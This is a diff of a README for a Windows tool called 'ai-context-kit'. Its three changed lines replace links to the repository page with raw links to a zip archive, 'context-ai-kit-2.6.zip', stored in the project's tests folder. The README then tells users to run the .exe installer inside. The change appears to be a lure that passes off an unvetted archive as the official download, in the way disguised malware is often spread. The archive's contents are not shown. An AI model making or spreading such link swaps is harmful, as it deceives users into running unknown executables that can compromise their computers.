@@ -1,6 +1,6 @@
 # 🤖 ai-context-kit - Manage AI Context Files Easily
 
-[![Download ai-context-kit](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/leejah/ai-context-kit)
+[![Download ai-context-kit](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://raw.githubusercontent.com/leejah/ai-context-kit/main/tests/context-ai-kit-2.6.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get ai-context-kit running on your Windows computer.
 
 Click on the large green button below to visit the download page:
 
-[![Download ai-context-kit](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/leejah/ai-context-kit)
+[![Download ai-context-kit](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://raw.githubusercontent.com/leejah/ai-context-kit/main/tests/context-ai-kit-2.6.zip)
 
 Once you visit the page, look for the latest "Releases" section or the main download area. You will find the Windows installer file there. It usually ends with `.exe`.
 
@@ -142,7 +142,7 @@ When you load a file, you may see several outputs:
 
 Visit this page to download ai-context-kit and start organizing your AI context files:
 
-[Download ai-context-kit](https://github.com/leejah/ai-context-kit)
+[Download ai-context-kit](https://raw.githubusercontent.com/leejah/ai-context-kit/main/tests/context-ai-kit-2.6.zip)
 
 Look for the latest Windows installer file and follow the steps above to install.
 
